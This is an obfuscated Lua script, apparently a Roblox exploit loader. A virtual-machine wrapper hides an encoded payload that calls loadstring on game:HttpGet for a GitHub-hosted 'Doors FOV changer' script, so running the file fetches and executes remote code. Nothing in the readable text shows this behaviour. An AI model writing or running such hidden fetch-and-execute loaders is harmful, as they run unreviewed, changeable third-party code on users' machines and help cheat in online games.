local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 1;
	local v19;
	v16 = v4(v3(v16, 5), "..", function(v30)
		if (v1(v30, 2) == 81) then
			local v82 = 0;
			while true do
				if (v82 ~= 0) then
				else
					v19 = v0(v3(v30, 1, 1));
					return "";
				end
			end
		else
			local v83 = 0;
			local v84;
			while true do
				if (v83 == 0) then
					v84 = v2(v0(v30, 16));
					if v19 then
						local v97 = 0;
						local v98;
						while true do
							if (v97 ~= 1) then
							else
								return v98;
							end
							if (v97 ~= 0) then
							else
								v98 = v5(v84, v19);
								v19 = nil;
								v97 = 1;
							end
						end
					else
						return v84;
					end
					break;
				end
			end
		end
	end);
	local function v20(v31, v32, v33)
		if v33 then
			local v85 = (v31 / ((5 - 3) ^ (v32 - (2 - 1)))) % (2 ^ (((v33 - (1 - 0)) - (v32 - (2 - 1))) + (620 - (555 + 64))));
			return v85 - (v85 % ((1809 - (282 + 595)) - ((2494 - (1523 + 114)) + 74)));
		else
			local v86 = 0;
			local v87;
			while true do
				if (v86 ~= 0) then
				else
					v87 = ((513 + 57) - (367 + 201)) ^ (v32 - (928 - (214 + 713)));
					return (((v31 % (v87 + v87)) >= v87) and (1 + 0)) or (0 + 0);
				end
			end
		end
	end
	local function v21()
		local v34 = v1(v16, v18, v18);
		v18 = v18 + 1;
		return v34;
	end
	local function v22()
		local v35, v36 = v1(v16, v18, v18 + 2);
		v18 = v18 + (2 - 0);
		return (v36 * (1321 - (68 + 997))) + v35;
	end
	local function v23()
		local v37 = 0;
		local v38;
		local v39;
		local v40;
		local v41;
		while true do
			if (v37 ~= (1271 - (226 + 1044))) then
			else
				return (v41 * ((134116146 - 61061372) - 56277558)) + (v40 * (65653 - (32 + 85))) + (v39 * (251 + 5)) + v38;
			end
			if (v37 == (0 + 0)) then
				v38, v39, v40, v41 = v1(v16, v18, v18 + (960 - ((1242 - (87 + 263)) + (245 - (67 + 113)))));
				v18 = v18 + (9 - 5);
				v37 = 1 - 0;
			end
		end
	end
	local function v24()
		local v42 = v23();
		local v43 = v23();
		local v44 = 1;
		local v45 = (v20(v43, 1 + (0 - 0), 49 - 29) * (((20 - (10 + 8)) + 0) ^ (127 - 95))) + v42;
		local v46 = v20(v43, (3742 - 2769) - (802 + 150), 83 - 52);
		local v47 = ((v20(v43, 57 - 25) == (1 + (442 - (416 + 26)))) and -((3186 - 2188) - (915 + 82))) or (2 - 1);
		if (v46 == 0) then
			if (v45 == (0 + 0)) then
				return v47 * (0 + 0);
			else
				v46 = 1 - 0;
				v44 = 1187 - (1069 + 118);
			end
		elseif (v46 ~= (4643 - 2596)) then
		else
			return ((v45 == ((0 - 0) - 0)) and (v47 * (1 / (0 + 0)))) or (v47 * NaN);
		end
		return v8(v47, v46 - ((2255 - (145 + 293)) - (1224 - (44 + 386)))) * (v44 + (v45 / ((2 + 0) ^ ((2329 - (998 + 488)) - (368 + 423)))));
	end
	local function v25(v48)
		local v49;
		if not v48 then
			local v88 = 0 + (0 - 0);
			while true do
				if (v88 ~= (0 + 0)) then
				else
					v48 = v23();
					if (v48 == (772 - (201 + 571))) then
						return "";
					end
					break;
				end
			end
		end
		v49 = v3(v16, v18, (v18 + v48) - 1);
		v18 = v18 + v48;
		local v50 = {};
		for v65 = 1139 - (116 + 1022), #v49 do
			v50[v65] = v2(v1(v3(v49, v65, v65)));
		end
		return v6(v50);
	end
	local v26 = v23;
	local function v27(...)
		return {...}, v12("#", ...);
	end
	local function v28()
		local v51 = (function()
			return 0 + 0;
		end)();
		local v52 = (function()
			return;
		end)();
		local v53 = (function()
			return;
		end)();
		local v54 = (function()
			return;
		end)();
		local v55 = (function()
			return;
		end)();
		local v56 = (function()
			return;
		end)();
		local v57 = (function()
			return;
		end)();
		local v58 = (function()
			return;
		end)();
		while true do
			local v67 = (function()
				return 0 + 0;
			end)();
			while true do
				if (v67 == 0) then
					if (v51 ~= (2 + 0)) then
					else
						v56[#"91("] = (function()
							return v21();
						end)();
						for v99 = #"~", v23() do
							local v100 = (function()
								return v21();
							end)();
							if (v20(v100, #"{", #"~") ~= (0 + 0)) then
							else
								local v126 = (function()
									return 0 - 0;
								end)();
								local v127 = (function()
									return;
								end)();
								local v128 = (function()
									return;
								end)();
								local v129 = (function()
									return;
								end)();
								local v130 = (function()
									return;
								end)();
								while true do
									if (v126 ~= 2) then
									else
										while true do
											if (v127 ~= #",") then
											else
												local v175 = (function()
													return 0 - 0;
												end)();
												local v176 = (function()
													return;
												end)();
												while true do
													if (v175 ~= (0 - 0)) then
													else
														v176 = (function()
															return 0 + 0;
														end)();
														while true do
															if (0 ~= v176) then
															else
																v130 = (function()
																	return {v22(),v22(),nil,nil};
																end)();
																if (v128 == (0 + 0)) then
																	local v187 = (function()
																		return 396 - (115 + 281);
																	end)();
																	local v188 = (function()
																		return;
																	end)();
																	while true do
																		if (v187 ~= 0) then
																		else
																			v188 = (function()
																				return 0 - 0;
																			end)();
																			while true do
																				if (v188 ~= 0) then
																				else
																					v130[#"91("] = (function()
																						return v22();
																					end)();
																					v130[#"asd1"] = (function()
																						return v22();
																					end)();
																					break;
																				end
																			end
																			break;
																		end
																	end
																elseif (v128 == #",") then
																	v130[#"-19"] = (function()
																		return v23();
																	end)();
																elseif (v128 == (2 + 0)) then
																	v130[#"xnx"] = (function()
																		return v23() - ((4 - 2) ^ (58 - 42));
																	end)();
																elseif (v128 ~= #"91(") then
																else
																	local v195 = (function()
																		return 867 - (550 + 317);
																	end)();
																	local v196 = (function()
																		return;
																	end)();
																	while true do
																		if (v195 ~= 0) then
																		else
																			v196 = (function()
																				return 0;
																			end)();
																			while true do
																				if (v196 ~= (0 - 0)) then
																				else
																					v130[#"asd"] = (function()
																						return v23() - (2 ^ (22 - 6));
																					end)();
																					v130[#"?id="] = (function()
																						return v22();
																					end)();
																					break;
																				end
																			end
																			break;
																		end
																	end
																end
																v176 = (function()
																	return 2 - 1;
																end)();
															end
															if (v176 ~= 1) then
															else
																v127 = (function()
																	return 287 - (134 + 151);
																end)();
																break;
															end
														end
														break;
													end
												end
											end
											if (v127 ~= #"asd") then
											else
												if (v20(v129, #"-19", #"asd") ~= #".") then
												else
													v130[#".dev"] = (function()
														return v58[v130[#".dev"]];
													end)();
												end
												v53[v99] = (function()
													return v130;
												end)();
												break;
											end
											if (v127 ~= (1665 - (970 + 695))) then
											else
												local v178 = (function()
													return 0;
												end)();
												local v179 = (function()
													return;
												end)();
												while true do
													if (0 ~= v178) then
													else
														v179 = (function()
															return 0;
														end)();
														while true do
															if (v179 ~= (0 - 0)) then
															else
																v128 = (function()
																	return v20(v100, 2, #"xnx");
																end)();
																v129 = (function()
																	return v20(v100, #"0313", 6);
																end)();
																v179 = (function()
																	return 1991 - (582 + 1408);
																end)();
															end
															if (v179 ~= 1) then
															else
																v127 = (function()
																	return #"~";
																end)();
																break;
															end
														end
														break;
													end
												end
											end
											if (v127 ~= 2) then
											else
												local v180 = (function()
													return 0 - 0;
												end)();
												local v181 = (function()
													return;
												end)();
												while true do
													if (v180 ~= 0) then
													else
														v181 = (function()
															return 0;
														end)();
														while true do
															if (v181 ~= 0) then
															else
																if (v20(v129, #"[", #",") ~= #"[") then
																else
																	v130[2] = (function()
																		return v58[v130[2 - 0]];
																	end)();
																end
																if (v20(v129, 2, 2) ~= #"{") then
																else
																	v130[#"xxx"] = (function()
																		return v58[v130[#"xnx"]];
																	end)();
																end
																v181 = (function()
																	return 3 - 2;
																end)();
															end
															if (v181 ~= (1825 - (1195 + 629))) then
															else
																v127 = (function()
																	return #"-19";
																end)();
																break;
															end
														end
														break;
													end
												end
											end
										end
										break;
									end
									if (v126 == (1 - 0)) then
										local v144 = (function()
											return 241 - (187 + 54);
										end)();
										local v145 = (function()
											return;
										end)();
										while true do
											if (v144 ~= (780 - (162 + 618))) then
											else
												v145 = (function()
													return 0;
												end)();
												while true do
													if (v145 ~= (0 + 0)) then
													else
														v129 = (function()
															return nil;
														end)();
														v130 = (function()
															return nil;
														end)();
														v145 = (function()
															return 1 + 0;
														end)();
													end
													if (v145 ~= (1 - 0)) then
													else
														v126 = (function()
															return 2 - 0;
														end)();
														break;
													end
												end
												break;
											end
										end
									end
									if (v126 == 0) then
										v127 = (function()
											return 0 + 0;
										end)();
										v128 = (function()
											return nil;
										end)();
										v126 = (function()
											return 1637 - (1373 + 263);
										end)();
									end
								end
							end
						end
						for v101 = #"}", v23() do
							v54, v101, v28 = (function()
								return v52(v54, v101, v28);
							end)();
						end
						return v56;
					end
					if (v51 ~= (1001 - (451 + 549))) then
					else
						v56 = (function()
							return {v53,v54,nil,v55};
						end)();
						v57 = (function()
							return v23();
						end)();
						v58 = (function()
							return {};
						end)();
						for v102 = #"~", v57 do
							local v103 = (function()
								return 0 + 0;
							end)();
							local v104 = (function()
								return;
							end)();
							local v105 = (function()
								return;
							end)();
							local v106 = (function()
								return;
							end)();
							while true do
								if (v103 ~= 1) then
								else
									v106 = (function()
										return nil;
									end)();
									while true do
										if (v104 ~= (0 - 0)) then
										else
											local v148 = (function()
												return 0 - 0;
											end)();
											while true do
												if (v148 ~= (1385 - (746 + 638))) then
												else
													v104 = (function()
														return 1 + 0;
													end)();
													break;
												end
												if (v148 ~= (0 - 0)) then
												else
													v105 = (function()
														return v21();
													end)();
													v106 = (function()
														return nil;
													end)();
													v148 = (function()
														return 1;
													end)();
												end
											end
										end
										if (v104 == 1) then
											if (v105 == #"}") then
												v106 = (function()
													return v21() ~= (341 - (218 + 123));
												end)();
											elseif (v105 == 2) then
												v106 = (function()
													return v24();
												end)();
											elseif (v105 ~= #"19(") then
											else
												v106 = (function()
													return v25();
												end)();
											end
											v58[v102] = (function()
												return v106;
											end)();
											break;
										end
									end
									break;
								end
								if (v103 ~= (1581 - (1535 + 46))) then
								else
									v104 = (function()
										return 0 + 0;
									end)();
									v105 = (function()
										return nil;
									end)();
									v103 = (function()
										return 1;
									end)();
								end
							end
						end
						v51 = (function()
							return 2;
						end)();
					end
					v67 = (function()
						return 1 + 0;
					end)();
				end
				if (1 == v67) then
					if (v51 ~= (560 - (306 + 254))) then
					else
						v52 = (function()
							return function(v107, v108, v109)
								local v110 = (function()
									return 0;
								end)();
								local v111 = (function()
									return;
								end)();
								while true do
									if (v110 == (0 + 0)) then
										v111 = (function()
											return 0;
										end)();
										while true do
											if (v111 ~= (0 - 0)) then
											else
												v107[v108 - #"\\"] = (function()
													return v109();
												end)();
												return v107, v108, v109;
											end
										end
										break;
									end
								end
							end;
						end)();
						v53 = (function()
							return {};
						end)();
						v54 = (function()
							return {};
						end)();
						v55 = (function()
							return {};
						end)();
						v51 = (function()
							return 1468 - (899 + 568);
						end)();
					end
					break;
				end
			end
		end
	end
	local function v29(v59, v60, v61)
		local v62 = v59[1 + (405 - (118 + 287))];
		local v63 = v59[(15 - 11) - 2];
		local v64 = v59[3];
		return function(...)
			local v68 = v62;
			local v69 = v63;
			local v70 = v64;
			local v71 = v27;
			local v72 = (1725 - (118 + 1003)) - (268 + 335);
			local v73 = -(291 - (60 + 230));
			local v74 = {};
			local v75 = {...};
			local v76 = v12("#", ...) - (1 + 0);
			local v77 = {};
			local v78 = {};
			for v89 = (4260 - 2804) - (282 + 1174), v76 do
				if (v89 >= v70) then
					v74[v89 - v70] = v75[v89 + 1];
				else
					v78[v89] = v75[v89 + (812 - (569 + 242))];
				end
			end
			local v79 = (v76 - v70) + (2 - 1);
			local v80;
			local v81;
			while true do
				v80 = v68[v72];
				v81 = v80[1];
				if (v81 <= 3) then
					if (v81 <= (1 + 0)) then
						if ((2104 >= 1421) and (v81 > 0)) then
							v78[v80[1026 - (706 + 318)]] = v80[1254 - (721 + 530)];
						else
							local v114 = 1271 - (945 + (703 - (142 + 235)));
							local v115;
							local v116;
							while true do
								if (v114 ~= (0 - (0 - 0))) then
								else
									v115 = v80[2 + 0 + 0];
									v116 = v78[v80[703 - (271 + 429)]];
									v114 = 1 + (977 - (553 + 424));
								end
								if ((1812 <= 3249) and (v114 == (1501 - (1408 + 92)))) then
									v78[v115 + (1087 - (461 + 625))] = v116;
									v78[v115] = v116[v80[1292 - (993 + 295)]];
									break;
								end
							end
						end
					elseif (v81 == (1 + 1)) then
						v78[v80[1173 - (418 + 753)]]();
					else
						local v117 = 0 + 0;
						local v118;
						local v119;
						local v120;
						local v121;
						while true do
							if (v117 == (1 + 0)) then
								v73 = (v120 + v118) - (1 + 0);
								v121 = 0 + 0;
								v117 = 2;
							end
							if (v117 ~= (529 - ((767 - 361) + 123))) then
							else
								v118 = v80[(1561 + 210) - (1749 + 20)];
								v119, v120 = v71(v78[v118](v13(v78, v118 + 1 + 0, v80[1325 - (1249 + 73)])));
								v117 = 1 + 0 + 0;
							end
							if ((1623 <= 1957) and (v117 == 2)) then
								for v146 = v118, v73 do
									local v147 = 1145 - (466 + 679);
									while true do
										if (v147 ~= (0 - 0)) then
										else
											v121 = v121 + (2 - 1);
											v78[v146] = v119[v121];
											break;
										end
									end
								end
								break;
							end
						end
					end
				elseif (v81 <= (1905 - (106 + 1045 + 749))) then
					if ((4412 == 4412) and (v81 > (2 + 2))) then
						do
							return;
						end
					else
						local v122 = v80[1 + 1];
						v78[v122] = v78[v122](v13(v78, v122 + (2 - 1), v73));
					end
				elseif (v81 <= (16 - 10)) then
					v78[v80[116 - (4 + 110)]] = v61[v80[3]];
				elseif ((1750 >= 842) and (v81 == (591 - (57 + 527)))) then
					local v131 = 1427 - (41 + 1386);
					local v132;
					local v133;
					local v134;
					local v135;
					local v136;
					while true do
						if (v131 ~= 9) then
						else
							do
								return;
							end
							break;
						end
						if (v131 ~= 7) then
						else
							v80 = v68[v72];
							v136 = v80[105 - (17 + 86)];
							v78[v136] = v78[v136](v13(v78, v136 + 1 + 0, v73));
							v72 = v72 + (1 - 0);
							v131 = 23 - 15;
						end
						if (v131 == 3) then
							v80 = v68[v72];
							v136 = v80[168 - (122 + 44)];
							v135 = v78[v80[3]];
							v78[v136 + 1] = v135;
							v131 = (3 + 3) - 2;
						end
						if (v131 ~= (6 - 4)) then
						else
							v72 = v72 + 1 + 0;
							v80 = v68[v72];
							v78[v80[2 + 0]] = v61[v80[1 + 2]];
							v72 = v72 + (1 - 0);
							v131 = (147 - 79) - (30 + (97 - 62));
						end
						if (v131 ~= 5) then
						else
							v72 = v72 + (2 - 1) + 0;
							v80 = v68[v72];
							v136 = v80[1259 - (304 + 739 + 214)];
							v133, v134 = v71(v78[v136](v13(v78, v136 + (3 - 2), v80[1215 - (323 + (4296 - 3407))])));
							v131 = 15 - 9;
						end
						if (v131 ~= (588 - (361 + (972 - (239 + 514))))) then
						else
							v80 = v68[v72];
							v78[v80[322 - (53 + 267)]]();
							v72 = v72 + 1 + 0;
							v80 = v68[v72];
							v131 = 9;
						end
						if ((413 - (15 + 398)) ~= v131) then
						else
							v132 = nil;
							v133, v134 = nil;
							v135 = nil;
							v136 = nil;
							v131 = 1;
						end
						if (v131 ~= 1) then
						else
							v78[v80[984 - (18 + 964)]] = {};
							v72 = v72 + 1;
							v80 = v68[v72];
							v78[v80[2]] = v61[v80[11 - 8]];
							v131 = 2 + 0;
						end
						if (v131 ~= (4 + 2)) then
						else
							v73 = (v134 + v136) - ((299 + 552) - (20 + 830));
							v132 = 0 + 0;
							for v173 = v136, v73 do
								local v174 = 126 - (116 + 10);
								while true do
									if ((4372 > 1850) and (v174 == (0 + 0))) then
										v132 = v132 + (739 - (542 + 196));
										v78[v173] = v133[v132];
										break;
									end
								end
							end
							v72 = v72 + (1 - (1329 - (797 + 532)));
							v131 = 7;
						end
						if ((232 < 821) and (v131 == (2 + 2))) then
							v78[v136] = v135[v80[3 + 1]];
							v72 = v72 + 1 + 0;
							v80 = v68[v72];
							v78[v80[4 - 2]] = v80[3];
							v131 = 12 - 7;
						end
					end
				else
					v78[v80[1553 - (819 + 307 + 425)]] = {};
				end
				v72 = v72 + 1;
			end
		end;
	end
	return v29(v28(), {}, v17)(...);
end
return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574035C3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F4E612Q786F5265616C2F442Q6F72732D464F562D4368616E6765722F726566732F68656164732F6D61696E2F666F766368616E6765722E6C756100094Q00077Q00122Q000100013Q00122Q000200023Q00202Q00020002000300122Q000400046Q000200046Q00013Q00024Q0001000100016Q00017Q00", v9(), ...);
